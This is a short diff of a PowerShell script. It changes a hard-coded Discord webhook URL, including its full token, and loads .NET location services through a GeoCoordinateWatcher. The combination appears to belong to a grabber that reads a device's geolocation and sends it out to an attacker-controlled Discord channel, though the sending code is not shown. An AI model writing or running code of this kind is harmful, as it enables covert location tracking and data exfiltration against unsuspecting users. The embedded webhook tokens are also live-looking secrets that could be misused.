@@ -1,4 +1,4 @@
-$WebhookUrl = "https://discord.com/api/webhooks/1506941432047472640/xCjy0vXg5noGJGCLjJQi65J_RINf1LpcR4ufXHswaRfvCsJdoTUkiJXflACRm-kq7yec"
+$WebhookUrl = "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT"
 
 Add-Type -AssemblyName System.Device
 $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
